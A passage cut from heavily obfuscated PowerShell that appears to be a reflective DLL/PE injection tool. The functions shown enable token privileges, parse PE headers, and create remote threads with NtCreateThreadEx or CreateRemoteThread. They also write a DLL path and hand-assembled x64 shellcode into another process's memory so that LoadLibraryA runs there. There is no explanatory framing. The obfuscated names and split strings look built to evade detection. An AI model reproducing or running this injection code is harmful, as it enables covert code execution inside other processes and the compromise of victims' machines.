        [UInt32]${T`okENPRiv`SiZE}  =   $Al9j::"si`ze`Of"( [Type]${win32`TyP`eS}."T`oKen_PRiv`Il`Eges")
        [IntPtr]${tOKenpr`IVIleges`M`em}  =   $al9j::("{3}{0}{2}{1}" -f'ocH','lobal','G','All'  ).Invoke( ${t`OKENP`RIVs`i`zE}  )
        ${tO`KEnPR`I`VIlEG`Es} =    $aL9j::"Ptr`TOSTRu`ctu`RE"(${tO`K`ENpri`ViL`egES`MeM}, [Type]${W`in32`TYPes}."tOk`e`N`_pr`IVileGEs"  )
        ${ToKe`NP`R`IVIlEG`Es}."PrI`V`ILeg`E`cOUNT" =  1
        ${tOkENpri`V`il`eGEs}."pri`V`ilEg`ES"."L`UId"  =    $Al9j::"pTR`TO`StRu`ctUrE"( ${PL`UiD}, [Type]${win`32tY`P`ES}."lU`ID" )
        ${t`oKenP`R`IvilEges}."pRI`VIlE`ges"."A`TT`RibuTeS"   = ${wiN32`coN`S`T`ANts}."Se_p`RIvilE`gE`_enablED"
         $aL9j::(  "{2}{0}{1}" -f 'ureToP','tr','Struct' ).Invoke(${Toke`NpRIvi`le`G`eS}, ${tO`K`enpR`i`VILEg`esMeM}, ${t`RuE} )

        ${ReS`UlT}  =  ${Win`32FUN`Cti`o`NS}."aDJ`Us`T`TOkEn`PR`IvILe`geS"."i`NvoKe"(  ${THRe`Ad`Tok`en}, ${FA`LsE}, ${T`OK`enPRiv`I`leGesMEm}, ${TokE`NpR`IVSi`ZE},  (    GeT-VArIABlE ( "WJ" + "ag7"  )    ).VAlUE::"ZE`Ro",   (  gCI  VariaBle:wJag7  ).vALUE::"ZE`Ro"  )
        ${ERRoR`CO`de} =  (  vaRIABLe  (  "A"  +"L9j"  )  -VaLUEO  )::( "{3}{4}{1}{2}{0}"-f 'r','32','Erro','Ge','tLastWin').Invoke(  )
        if ((  ${r`esUlT} -eq ${F`A`LSE}  ) -or (${e`R`ROr`Code} -ne 0  ))
        {
           
        }

          (get-VaRIAblE Al9j  -VAl    )::("{0}{1}{2}{3}" -f 'Fr','e','eH','Global').Invoke( ${tokEnp`RIvilegE`s`m`eM} )
    }


    Function inVoKE`-CReaTErEMo`TE`T`hR`eAd
    {
        Param(  
        [Parameter( POsITIon   =   1, mANdAtORY   =   ${Tr`UE})]
        [IntPtr]
        ${p`RocESs`HA`Nd`Le},

        [Parameter( poSitiON =  2, MANdAtORy  =  ${TR`UE}  )]
        [IntPtr]
        ${st`Arta`DdRE`SS},

        [Parameter(  pOSITIOn = 3, mAndAtory = ${Fa`lsE})]
        [IntPtr]
        ${A`RGumEN`Tp`TR} =     (   GI ("VARiAb" +"le"  +  ":wJAg" + "7" ) ).ValUe::"zE`Ro",

        [Parameter(  PosiTiON =  4, MandAtorY = ${t`RuE} )]
        [System.Object]
        ${Wi`N3`2fuN`cTioNs}
          )

        [IntPtr]${r`EmOTe`T`hREADhAnDle} =    (   LS ('v'  +'aRiABLe'  + ':wJa'  +'G7' )    ).vAlUE::"Ze`RO"

        ${oS`VeRs`IoN}   =   (    ITEM (  "vaR"  +  "Iab"  +  "LE:1Z6")   ).VaLUE::"OsvERsI`oN"."veR`s`IOn"
       
        if (  ( ${OsveR`s`ion} -ge (   &  ("{1}{2}{0}"-f'ject','New-','Ob' ) 'Version' 6,0 )  ) -and (  ${O`S`VerSIoN} -lt (  &("{2}{0}{1}" -f 'je','ct','New-Ob' ) 'Version' 6,2) ) )
        {
             & ("{1}{0}{4}{2}{3}"-f'e-','Writ','er','bose','V' ) "Modified: Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
            ${RE`Tv`AL}=  ${wIn32F`UNc`T`iO`NS}."nt`CrE`At`EThReADEx"."INVo`ke"( [Ref]${reMotEt`hREad`HA`Nd`lE}, 0x1FFFFF,   ( GcI VARiabLe:wJaG7    ).valUE::"Z`ErO", ${p`Roc`eSsha`NDLe}, ${s`TAR`Tad`DreSS}, ${Argum`eNT`PtR}, ${F`AL`Se}, 0, 0xffff, 0xffff,  $wjAG7::"ZE`Ro"  )
            ${La`s`TErrOR}   =  (LS vaRIable:aL9J    ).ValUE::(  "{2}{5}{1}{4}{3}{0}" -f '2Error','as','Ge','Win3','t','tL' ).Invoke(  )
            if (${r`Em`Ot`ETHrEADH`ANdLe} -eq  $wjag7::"z`eRO" )
            {
                Throw "Modified: Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
            }
        }
       
        else
        {
            & ( "{1}{3}{0}{2}" -f'-Verbo','W','se','rite'  ) "Modified: Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
            ${REM`otEtH`Rea`Dh`AND`le}  = ${Wi`N32FunC`TI`o`NS}."crEA`TeR`E`m`ote`THread"."i`N`VoKE"( ${Pr`O`cES`SHaNd`Le},  ( gEt-VariAbLE  WjAG7 ).ValUe::"ze`Ro", [UIntPtr][UInt64]0xFFFF, ${s`TA`RtaDdr`ESS}, ${ArG`U`ME`Ntptr}, 0,   (   GEt-chilDiteM  vARIAbLe:wjag7  ).VALUE::"Ze`Ro")
        }

        if (${R`eMoT`e`THR`e`AdH`AndLe} -eq  $wjAg7::"zE`RO" )
        {
            & (  "{1}{0}{2}"-f 'ite-Ver','Wr','bose'  ) "Modified: Error creating remote thread, thread handle is null"
        }

        return ${rEmOTeTHreA`D`han`D`le}
    }



    Function GEt-iMag`En`Th`eADErS
    {
        Param(  
        [Parameter(POSiTION  = 0, mANdAtoRY   =   ${T`RUE} )]
        [IntPtr]
        ${PE`HA`NdlE},

        [Parameter(pOsItioN  =  1, mandAToRY =  ${t`Rue} )]
        [System.Object]
        ${w`iN32Typ`ES}
          )

        ${Nt`Hea`d`eRSINfo}  =  &( "{3}{2}{1}{0}"-f't','c','Obje','New-') (  "{2}{0}{3}{1}"-f'j','t','System.Ob','ec' )

       
        ${dos`h`E`ADer}   =   (  DiR  vArIABle:al9j    ).valUE::"pTrt`os`TRuctU`Re"( ${P`EhAnDle}, [Type]${wiN32`Ty`Pes}."IMa`gE_Do`S`_HeADEr")

       
        [IntPtr]${NtH`eaDe`RsPTR}  =   [IntPtr](    &  ( "{3}{2}{5}{1}{0}{4}" -f'i','IntAsUns','ne','Add-Sig','gned','d') ([Int64]${PehaN`dle}  ) (  [Int64][UInt64]${dOs`hEAD`ER}."e`_LF`ANEw")  )
        ${n`T`HE`ADeRsinFo}   |  &  (  "{2}{0}{1}"-f 'dd-Memb','er','A') -MemberType (  "{2}{0}{1}" -f 'otePr','operty','N' ) -Name ("{0}{3}{2}{1}"-f'NtH','tr','ersP','ead' ) -Value ${n`THEADe`RS`PTR}
        ${iMAG`e`NTheADE`R`S64} =   ( VaRiabLE  al9j  -vAlUEOn )::"pTRTOstr`UC`T`U`Re"(${ntH`e`AdEr`sPTr}, [Type]${W`In32`TyPEs}."IM`AGE_N`T_HE`ADeR`S64"  )

       
        if ( ${imagENt`Hea`dE`RS64}."siGn`Atu`Re" -ne 0x00004550  )
        {
            Throw "Modified: Invalid IMAGE_NT_HEADER signature."
        }

        if (  ${I`mA`g`entHeAd`erS`64}."OpTi`o`NA`Lhea`deR"."mAG`ic" -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC'  )
        {
            ${nt`hea`DERSInfo}  |    & ("{3}{0}{1}{2}"-f'dd-M','e','mber','A') -MemberType (  "{1}{2}{0}"-f 'erty','Note','Prop' ) -Name ("{0}{2}{4}{3}{1}"-f 'IMAGE','S','_','DER','NT_HEA'  ) -Value ${I`M`AGen`TheadeRs`64}
            ${nTheADeRs`iN`Fo}  |   &  (  "{3}{0}{1}{2}"-f 'dd-','Mem','ber','A') -MemberType (  "{2}{1}{3}{0}" -f 'y','tePro','No','pert'  ) -Name ( "{1}{0}"-f 't','PE64Bi') -Value ${Tr`Ue}
        }
        else
        {
            ${ImaG`En`TH`eAdERs32}   =    (   GeT-vARIabLe  (  "a"  +"L9J") ).VaLUe::"pTRTo`STR`UcT`URE"( ${Nth`E`ADERsPTR}, [Type]${w`in`32tYP`Es}."I`m`AgE_NT_HeadEr`S32")
            ${nt`HE`AD`ErSINfo} |   &  ("{1}{0}{3}{2}"-f'd-M','Ad','r','embe' ) -MemberType ("{0}{2}{1}"-f'NoteProp','ty','er' ) -Name ("{3}{4}{0}{2}{1}" -f 'E_NT_H','ERS','EAD','IM','AG') -Value ${i`mag`enTHEAdERs`32}
            ${n`THEa`deRSINFO}   |   &  ("{0}{2}{1}"-f 'Ad','-Member','d') -MemberType (  "{1}{0}{2}"-f 'Propert','Note','y') -Name (  "{1}{0}{2}"-f 'E64Bi','P','t') -Value ${fa`Lse}
        }

        return ${Nt`hEa`de`R`sINFo}
    }


   
    Function gET`-pEbas`ICIN`FO
    {
        Param(
        [Parameter(   POSITIoN  =  0, mANDaTOry =  ${t`RUE} )]
        [Byte[]]
        ${pE`By`Tes},

        [Parameter( POsItIOn = 1, mandaTOry   =   ${T`RuE})]
        [System.Object]
        ${Win`3`2`TYpes}
        )

        ${PeI`NFO} =   &  ("{2}{1}{0}"-f 'Object','ew-','N') (  "{2}{0}{3}{1}"-f 'y','ject','S','stem.Ob'  )

       
        [IntPtr]${UNma`N`Ag`EDpeb`Y`TeS}   =    $AL9j::( "{0}{2}{3}{1}"-f'All','bal','oc','HGlo'  ).Invoke(  ${P`EBY`TEs}."Le`N`gTh")
          $AL9J::(  "{1}{0}" -f'opy','C'  ).Invoke(${pebY`T`eS}, 0, ${UnM`ANAgeD`p`e`BYt`es}, ${P`ebYT`ES}."leN`gTh" )   |    &  (  "{0}{2}{1}" -f'Out-','l','Nul' )

       
        ${N`T`HeA`DERSINfO} =   &("{1}{2}{3}{0}" -f'ders','Get-','Image','NtHea' ) -PEHandle ${uNm`ANAGEDp`EB`yt`ES} -Win32Types ${WI`N32T`yPEs}

       
        ${pe`infO}  |  &  ( "{2}{0}{1}" -f'-Memb','er','Add') -MemberType ( "{2}{1}{3}{0}"-f'y','tePrope','No','rt') -Name 'PE64Bit' -Value (${n`TheAD`e`RSIN`FO}."Pe`64`BIt"  )
        ${PeIN`Fo}   |   &  ( "{2}{1}{0}"-f'ber','d-Mem','Ad') -MemberType (  "{1}{3}{2}{0}" -f 'ty','Not','roper','eP' ) -Name 'OriginalImageBase' -Value (  ${ntH`EADERs`INfo}."iMage`_nT_he`AdE`RS"."OPtI`o`NaLHeADER"."imA`geb`AsE")
        ${p`EINfo} |  &  ("{2}{1}{3}{0}"-f 'r','M','Add-','embe') -MemberType ("{2}{3}{0}{1}" -f'per','ty','Note','Pro'  ) -Name 'SizeOfImage' -Value ( ${nT`Head`er`SI`NFo}."IMA`G`E_NT`_HeAD`ers"."OptI`onA`L`HeaDeR"."s`I`Z`EoFIMAGe" )
        ${p`EInfO} |    &  ("{2}{1}{0}"-f'mber','dd-Me','A' ) -MemberType (  "{0}{2}{1}"-f 'NotePro','y','pert' ) -Name 'SizeOfHeaders' -Value (${nTHEA`De`RsI`N`FO}."i`Ma`ge_`Nt_he`ADErS"."o`pTIONA`lH`e`AdEr"."S`IzeO`Fhea`DErs" )
        ${PE`In`Fo}  | & ("{2}{1}{0}"-f 'ember','M','Add-'  ) -MemberType ( "{3}{1}{2}{0}" -f 'rty','op','e','NotePr'  ) -Name 'DllCharacteristics' -Value (  ${nT`hEad`E`R`sinfO}."i`MagE`_Nt`_HE`AdErs"."opTio`NAL`H`Eader"."DllCHa`R`AcTEr`IS`TIcS")

       
          $al9J::( "{3}{0}{2}{1}" -f'eeHGl','al','ob','Fr' ).Invoke(${uN`maN`Ag`edPeby`TeS} )

        return ${PE`i`NfO}
    }


   
   
    Function GEt-pE`dEtAIlED`I`NFo
    {
        Param(
        [Parameter(   pOsiTIoN = 0, mANDatoRy =   ${TR`UE})]
        [IntPtr]
        ${PE`HAnd`LE},

        [Parameter(  pOSiTION  =  1, mAnDAtOry   = ${t`Rue}  )]
        [System.Object]
        ${wIn`3`2`TypES},

        [Parameter(  poSITIoN  =   2, MaNDatOry =  ${T`RUe} )]
        [System.Object]
        ${wiN3`2c`oNST`Ants}
          )

        if (  ${pEh`AnD`le} -eq ${N`ULL} -or ${P`eHAndlE} -eq  $wjaG7::"z`ERO")
        {
            throw 'Modified: PEHandle is null or IntPtr.Zero'
        }

        ${p`EIN`Fo}   =  & ("{2}{0}{1}{3}" -f 'ew-','Obje','N','ct') ( "{2}{1}{0}"-f 'ct','Obje','System.'  )

       
        ${nth`EADEr`SIN`Fo}   =  & (  "{0}{1}{2}{3}" -f'Get-','Image','NtHea','ders' ) -PEHandle ${p`EHANdlE} -Win32Types ${Win`32T`yP`ES}

       
        ${PE`info} |     &(  "{0}{1}{2}"-f'Ad','d-','Member' ) -MemberType (  "{0}{3}{1}{2}"-f 'Note','ert','y','Prop' ) -Name ( "{0}{2}{1}" -f 'PEH','dle','an'  ) -Value ${p`ehaN`DlE}
        ${PEI`NFo} |  & ( "{0}{2}{1}" -f'A','-Member','dd'  ) -MemberType ( "{3}{1}{2}{0}" -f 'y','roper','t','NoteP' ) -Name ( "{3}{2}{0}{1}" -f'T_HEA','DERS','GE_N','IMA') -Value (  ${nTheAD`eRS`I`Nfo}."iMagE_n`T_h`e`ADERS"  )
        ${Pei`NfO} |   & ("{3}{2}{1}{0}" -f 'er','emb','-M','Add'  ) -MemberType (  "{1}{2}{0}"-f'ty','Not','eProper'  ) -Name ( "{0}{3}{2}{1}"-f'Nt','ersPtr','ad','He' ) -Value (${N`T`h`eADEr`SINfO}."nt`heade`Rs`ptR"  )
        ${P`EIn`Fo} |   &("{2}{0}{1}" -f 'dd-Mem','ber','A') -MemberType (  "{1}{3}{2}{0}"-f 'y','Note','t','Proper') -Name ("{2}{1}{0}" -f 'it','B','PE64'  ) -Value (  ${nt`hEa`De`RSiNFo}."P`e64`BIT" )
        ${pE`inFo} |   &( "{0}{3}{1}{2}"-f 'Add','mbe','r','-Me' ) -MemberType ("{3}{1}{2}{0}" -f 'ty','tePr','oper','No'  ) -Name 'SizeOfImage' -Value (  ${N`THeADerSI`N`Fo}."i`maG`e_nT`_HeAD`ErS"."O`pTI`ONa`Lh`eADer"."siZEofIm`A`GE")

        if ( ${p`eIn`Fo}."pE6`4BiT" -eq ${tR`Ue} )
        {
            [IntPtr]${SecTi`ONhead`erP`Tr}  =  [IntPtr](    & ("{4}{3}{2}{0}{1}"-f'AsUnsigne','d','nedInt','-Sig','Add') ([Int64]${pEi`Nfo}."n`TheAD`ERspTR") (  $Al9j::"Si`ze`OF"([Type]${wi`N32T`ypes}."Im`Age`_`Nt_h`eAdE`RS64"  )) )
            ${PEi`N`Fo}   |    &("{3}{0}{1}{2}"-f '-Me','mbe','r','Add') -MemberType (  "{1}{0}{3}{2}"-f 'eP','Not','erty','rop') -Name ("{1}{3}{4}{2}{5}{0}" -f 'tr','Sect','eade','io','nH','rP'  ) -Value ${sEctioNh`ea`d`ER`ptR}
        }
        else
        {
            [IntPtr]${s`e`CTIoNhE`AdeRPTR}  =  [IntPtr](  &  ("{3}{0}{4}{2}{1}" -f'ne','d','ntAsUnsigne','Add-Sig','dI') (  [Int64]${pEI`NFo}."ntHeADE`R`SPtr"  ) (   (   gEt-vARIable  AL9J -VaLUE )::"S`iZEof"( [Type]${WIn`3`2tYPes}."ImA`g`E_nT_`hEADER`S32")  )  )
            ${PE`i`NFO} |  &( "{0}{3}{1}{2}" -f 'Ad','be','r','d-Mem') -MemberType ("{0}{2}{1}"-f 'Note','ty','Proper'  ) -Name ( "{1}{2}{4}{0}{3}"-f 'derP','Se','ct','tr','ionHea') -Value ${SeCTIOn`h`eA`D`ERpTR}
        }

        if (  (  ${N`T`HEA`dersI`NFo}."Imag`e_nT_h`Ea`deRS"."FilE`h`Eader"."cHAraCTErisT`I`cs" -band ${win32`coN`S`TA`NTS}."I`MA`gE_`FIlE_Dll" ) -eq ${win3`2`con`ST`AntS}."I`MaGe_FILE`_`dll")
        {
            ${p`E`INfO}  |   &  (  "{1}{2}{0}" -f'ber','Add','-Mem') -MemberType (  "{0}{2}{1}"-f'No','operty','tePr') -Name ( "{1}{0}"-f'eType','Fil' ) -Value 'DLL'
        }
        elseif (  (  ${NThEADE`Rsi`N`Fo}."I`mAGE_Nt_h`e`ADe`Rs"."FIl`eHea`der"."Cha`RACTeRiST`ICS" -band ${WI`N3`2c`oN`staNTS}."Ima`Ge_fI`le_execUtaB`LE`_`I`mAgE") -eq ${W`I`N`32cOnstaNtS}."imag`E_`Fi`le_Ex`ECUtABL`E_`im`AGE" )
        {
            ${Pe`i`NFO}   |     & ("{0}{2}{1}"-f'Add-M','er','emb' ) -MemberType ( "{0}{3}{2}{1}"-f 'Not','ty','r','ePrope'  ) -Name (  "{1}{0}" -f 'leType','Fi') -Value 'EXE'
        }
        else
        {
            Throw "Modified: PE file is not an EXE or DLL"
        }

        return ${PEi`NFO}
    }


    Function i`Mp`oRt-dl`LiNrEMOTEp`R`OcEss
    {
        Param( 
        [Parameter( POsItiOn = 0, mandATORy  =${TR`UE})]
        [IntPtr]
        ${rEM`OT`E`proc`hand`Le},

        [Parameter(POSItion= 1, mANDatOrY  =  ${tr`UE} )]
        [IntPtr]
        ${i`MPO`Rt`dLLpAtHPTR}
         )

        ${Pt`R`SIZE} =   (   VarIAbLE ("A"+ "l9j" )   ).VALue::"SiZ`EoF"( [Type][IntPtr])

        ${iMPO`RTDlL`pAtH}   =    (  Dir (  'Va' +  'RIAbLE'+ ':aL'  + '9j' )  ).Value::("{1}{2}{3}{0}"-f 'Ansi','P','trToStrin','g' ).Invoke(${I`MpOr`TD`lLPAtHpTR} )
        ${D`LLPA`TH`SIzE} = [UIntPtr][UInt64]([UInt64]${iMP`ortdL`LPa`TH}."LE`NGtH" +  1  )
        ${rIMP`ortdllp`A`TH`Ptr}   =  ${wI`N32FU`NctIonS}."VirT`Ua`LAllOcEx"."i`NVOKe"(  ${r`e`mOt`EPRocHanDLe},   ( ls vaRiaBle:WjAG7  ).ValUE::"Z`erO", ${DLlpA`THs`I`ZE}, ${wIn32`C`O`NsTAnTs}."Mem`_CO`m`mit" -bor ${wIn3`2`cOnSta`Nts}."ME`m_re`sErvE", ${WiN32C`oNstA`NtS}."p`Age`_`REaDwritE" )
        if ( ${ri`MPORT`dLl`Pa`ThpTr} -eq  (    GeT-cHiLdItem  variablE:wjAG7 ).vALue::"Z`ErO" )
        {
            Throw "Modified: Unable to allocate memory in the remote process"
        }

        [UIntPtr]${nuM`B`ytE`sWRI`TteN}   =  $078M::"z`ero"
        ${SUCce`ss}   =   ${w`In`3`2fUNCtIo`NS}."W`RI`T`eP`RO`CesSmemoRy"."INvO`ke"(  ${Re`mOtep`ROcH`ANdLe}, ${RiM`Por`TdLLpAT`HpTR}, ${im`poR`T`dllpA`T`HPTR}, ${D`LL`PaThSIze}, [Ref]${Nu`m`ByTEswri`TtEN} )

        if (  ${sUCC`eSs} -eq ${f`AlsE}  )
        {
            Throw "Modified: Unable to write DLL path to remote process memory"
        }
        if (${d`LL`pAtHsi`Ze} -ne ${numBy`T`eS`W`RITT`En}  )
        {
            Throw "Modified: Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
        }

        ${keR`Nel32`h`ANDlE} =   ${WIn32`F`UNC`TIOns}."GeTmo`DUlEHAND`le"."I`NvO`ke"("kernel32.dll")
        ${Lo`Ad`libra`R`Y`AadDr}  = ${Wi`N`32func`T`iONs}."gET`PRoC`A`DDrEsS"."In`V`okE"(${KERNeL`3`2`hANdlE}, "LoadLibraryA")

        [IntPtr]${D`ll`AD`drESs} =   ( Get-CHIlditeM vAriAble:Wjag7   ).VALUe::"ZE`RO"
       
       
        if (${pE`i`NFo}."pe6`4B`it" -eq ${T`RUe}  )
        {
           
            ${l`oAdlibRA`RYA`R`ETmem}  =   ${WIn3`2FunC`T`iOnS}."vIrTuaL`ALloC`Ex"."InVO`KE"(${Re`m`OTe`P`RoC`hanDLE},  $WjAG7::"Z`ErO", ${DLlP`AT`H`SIze}, ${WiN32`CoNSt`A`NTs}."meM_`cO`Mm`it" -bor ${wIN32conS`T`A`Nts}."Mem_r`es`ERVE", ${wi`N32Con`sTANtS}."p`AGe`_reAdWr`ITE"  )
            if ( ${loaDLiB`RAryar`ETm`eM} -eq   (   GEt-chiLdiTem VARIAbLE:wJaG7  ).VAlUE::"zE`Ro"  )
            {
                Throw "Modified: Unable to allocate memory in the remote process for the return value of LoadLibraryA"
            }


           
            ${lO`A`DlIbR`ARysC1}   =   @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9  )
            ${loADLIbr`A`RY`sC2}  =   @(0x48, 0xba )
            ${lOA`dL`IBrar`yS`C3} = @(0xff, 0xd2, 0x48, 0xba  )
            ${LOa`dlibrA`RYSC4}   =   @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3  )

            ${Sc`l`en`GTH}  =   ${LoADL`I`BRarys`C1}."LENg`TH"  + ${lO`Adl`ib`RaRysc2}."l`E`NgTh"  +   ${L`OAdLibr`Ary`sC3}."Le`NGTH"  +  ${Lo`AdLiB`RaRY`SC4}."lE`NG`Th"   +   ( ${pTr`SiZE} * 3)
            ${s`CPs`MEM}   =   (  VARiABlE  Al9J ).vAluE::(  "{2}{0}{1}"-f'l','obal','AllocHG'  ).Invoke(${SC`L`EnGtH}  )
            ${s`cpSMEmor`I`G`I`Nal} =   ${s`CPs`mem}

             & (  "{4}{2}{0}{3}{1}" -f 'ytesT','y','rite-B','oMemor','W'  ) -Bytes ${LoAD`l`IBrA`RYSC1} -MemoryAddress ${scps`M`eM}
            ${Sc`p`sMeM}   =    &  (  "{6}{0}{5}{2}{4}{1}{3}" -f 'dd-S','tAsUnsigne','gned','d','In','i','A') ${SC`ps`MEM} (  ${LoA`d`LIBrArys`c1}."LE`N`gTH"  )
              (  gET-ItEM ( "VA" + "riaBLe:"+  "Al9J") ).vALUe::("{3}{2}{0}{1}" -f'ToP','tr','re','Structu' ).Invoke( ${rI`MPo`RTdLlPaTh`PTr}, ${s`Cpsm`em}, ${f`AlSe})
            ${sc`PSm`eM} =    & ("{0}{3}{4}{1}{6}{2}{5}" -f'A','I','sUnsi','dd-Si','gned','gned','ntA'  ) ${S`CPsMeM} (  ${P`T`RsIZe} )
            &("{2}{3}{0}{1}{4}{5}" -f'-B','ytesTo','Wri','te','Me','mory'  ) -Bytes ${loaDL`iBr`ARySC2} -MemoryAddress ${S`CPSm`eM}
            ${Sc`P`SMEM} =   &( "{2}{1}{0}{3}{4}" -f 'Int','igned','Add-S','AsUnsi','gned' ) ${scPS`M`EM} (  ${loADLiBrA`R`YsC2}."len`gTh"  )
             (  gET-VARIAblE al9j  -vA)::("{4}{2}{1}{0}{3}" -f 'eToP','uctur','r','tr','St' ).Invoke( ${lOa`dlIb`R`Ar`Ya`AddR}, ${sC`PS`mem}, ${faL`sE} )
            ${S`Cp`SmEm}  = &  ( "{0}{1}{2}{3}{6}{5}{4}" -f'A','dd-Sign','edInt','A','gned','nsi','sU') ${SCp`sM`em} (  ${ptRSI`Ze})
            & ( "{0}{2}{1}{3}"-f'Write','r','-BytesToMemo','y') -Bytes ${lOa`dL`ibRaRy`SC3} -MemoryAddress ${sc`pSMEm}
            ${s`cPSm`eM}  =   &(  "{4}{0}{6}{2}{3}{1}{5}"-f 'd-SignedIntAs','gn','ns','i','Ad','ed','U') ${sc`pSMeM} (  ${lO`ADlIbRa`R`YS`c3}."leNG`Th"  )
              (  GCI vAriaBLe:Al9J ).vAlUE::(  "{1}{0}{2}" -f 'tru','S','ctureToPtr' ).Invoke(  ${lOADL`I`Brar`yA`RE`TMEM}, ${SCp`S`mem}, ${FA`LSE} )
            ${sC`pSM`em} =   &("{0}{1}{2}{3}"-f'Add-SignedIntA','sUns','ign','ed') ${ScPSM`Em} (${pt`Rsi`ZE}  )
             &( "{0}{1}{2}{3}" -f'Write-BytesTo','Mem','o','ry'  ) -Bytes ${LOA`d`liBRArySC4} -MemoryAddress ${SC`ps`meM}
            ${Sc`p`sMeM}  = &  ( "{2}{3}{0}{1}{5}{4}" -f 'n','tAsUnsig','Add-Sign','edI','d','ne') ${s`cPs`Mem} ( ${lOA`DL`i`BrAr`YSC4}."le`N`GTH" )


            ${rscaD`Dr}  =  ${wi`N32FuN`CtI`O`Ns}."VIRtu`Ala`L`loCEx"."iN`VoKe"( ${rEmOT`E`prO`c`HANdLe},   (    Get-VAriABlE ( 'w' +  'jAg7'  ) ).VaLUe::"Ze`RO", [UIntPtr][UInt64]${sC`l`ength}, ${WI`N3`2co`NSTaNTs}."me`m_c`OMmit" -bor ${W`iN`32c`oNstA`Nts}."ME`m`_rEser`Ve", ${Wi`N32c`o`NsTaNTs}."pAGe_ex`ec`U`Te_REAdWriTe")
            if (  ${r`sCa`DDr} -eq  ( vaRiABLe  ( "wJAG"  +  "7"  )  ).ValUE::"Z`ERo"  )
            {
                Throw "Modified: Unable to allocate memory in the remote process for shellcode"
            }

            ${suCCe`ss} =   ${WIN32f`UNc`TI`o`NS}."Write`Pr`OcESSmem`ORY"."I`Nvo`kE"( ${rEmO`T`e`pRo`cHaNDlE}, ${RsCad`DR}, ${SC`psME`mORig`I`NAL}, [UIntPtr][UInt64]${S`clEngth}, [Ref]${n`UMB`YTES`wrITT`eN} )
            if (  ( ${SUc`CE`sS} -eq ${F`ALSe}) -or ( [UInt64]${NuMBYT`esw`Ri`TTeN} -ne [UInt64]${scl`EN`GTh})  )
            {
                Throw "Modified: Unable to write shellcode to remote process memory."
            }

            ${RtHrEAD`HA`NdLE}   =  & ("{6}{0}{2}{4}{3}{5}{1}"-f'nvoke-C','ad','re','mot','ateRe','eThre','I' ) -ProcessHandle ${remOt`EpR`ocHAN`DLE} -StartAddress ${R`sc`ADdR} -Win32Functions ${W`i`N3`2FUncTiONS}
            ${rESU`lt}   =   ${wIN32`F`U`NC`TIons}."w`AITFOR`SIN`gLE`ObJeCT"."In`Vo`kE"( ${r`T`Hrea`dHAndLE}, 20000  )
            if (${R`e`Sult} -ne 0 )
            {
                Throw "Modified: Call to CreateRemoteThread to call GetProcAddress failed."
            }

           
            [IntPtr]${ReTUR`N`ValmeM}  =     (  vArIAblE  aL9J -va   )::(  "{0}{3}{1}{2}" -f'A','a','l','llocHGlob'  ).Invoke(${P`TR`siZe} )
            ${reS`UlT}   = ${WI`N`3`2fUnctions}."readPROC`e`SSm`EmO`RY"."iNv`oKe"(  ${rEmO`T`epr`oC`H`ANdle}, ${LOA`dlibR`ArYaReTm`eM}, ${rETURnV`AL`mEM}, [UIntPtr][UInt64]${PTR`S`IZE}, [Ref]${nUmBYt`ESWr`ItT`eN})
            if ( ${REs`UlT} -eq ${f`A`LsE} )
            {
                Throw "Modified: Call to ReadProcessMemory failed"
            }
            [IntPtr]${dl`LAdDrE`sS}   =    $AL9j::"PTRtos`TRU`CTure"(${R`eTurN`ValmEm}, [Type][IntPtr] )

            ${WIN32F`Un`c`TiO`Ns}."viR`T`U`AlfrEEeX"."IN`VoKE"( ${R`EmoTEP`RO`CHandLE}, ${loadLibrAr`YAR`E`T`mem}, [UIntPtr][UInt64]0, ${WIn`3`2CO`NSTaNTS}."mem`_rELE`A`Se" )   |   &("{2}{1}{0}"-f'ull','N','Out-')
            ${wiN`32FUnCT`i`Ons}."V`I`RTUA`lfrEEeX"."INVO`Ke"(${ReMOTepr`O`cHAn`DLe}, ${Rs`c`ADdr}, [UIntPtr][UInt64]0, ${WI`N32c`ON`ST`AntS}."M`eM`_rElea`se"  )   |   &  (  "{2}{1}{0}" -f'ull','ut-N','O' )
        }
        else
        {
            [IntPtr]${Rthr`EADH`A`NDle} =    & ( "{2}{4}{3}{0}{1}" -f'hr','ead','Invoke','RemoteT','-Create') -ProcessHandle ${r`EMOTEp`ROc`handle} -StartAddress ${LOaD`liBRAR`YAAd`DR} -ArgumentPtr ${rImPOrT`D`LlPatH`pTR} -Win32Functions ${wI`N32Fu`N`CTioNs}
            ${R`E`SuLT} = ${wiN3`2`FUnc`Tio`NS}."wai`TFO`RsI`NgleObJE`ct"."i`N`VokE"(  ${r`THReadha`NDlE}, 20000  )
            if (  ${RE`sU`lt} -ne 0)
            {
                Throw "Modified: Call to CreateRemoteThread to call GetProcAddress failed."
            }

            [Int32]${ex`itcODE}   = 0
            ${re`SulT}   =   ${W`IN`32fUN`CtiONs}."ge`TeXItCOD`eTHr`EAd"."i`NvoKe"(${rT`H`RE`Adh`AnDlE}, [Ref]${eXIT`c`O`DE} )
            if (  (  ${R`Esult} -eq 0) -or (${e`X`ItCoDE} -eq 0))
            {
                Throw "Modified: Call to GetExitCodeThread failed"
            }

            [IntPtr]${Dl`l`Ad`drEss}  = [IntPtr]${e`XItcO`DE}
        }

        ${Wi`N32FUn`CTI`OnS}."vir`TuA`LFREe`eX"."iNVO`Ke"(  ${RE`Mo`TEpr`OcHa`NDLe}, ${rIm`PORtdlL`PAtH`ptR}, [UIntPtr][UInt64]0, ${WIN3`2CONSt`A`NTS}."m`eM_`RE`LeaSE"  ) |   &  (  "{1}{2}{0}" -f 'ull','O','ut-N')

        return ${dl`laDDRE`sS}
    }


    Function GET-rEMo`TEprOca`D`DrESs
    {
        Param(  
        [Parameter(  pOsitIOn= 0, maNdAtory =${t`Rue})]
        [IntPtr]
        ${Re`m`OteprOc`h`ANDle},

        [Parameter(POsitiON = 1, MaNDAtoRY  =${T`Rue}  )]
        [IntPtr]
        ${remo`TEDl`lH`AN`DlE},

        [Parameter( pOsitION  =  2, MANDaTORY =${T`RUe})]
        [String]
        ${f`U`NCt`IONN`AmE}
        )

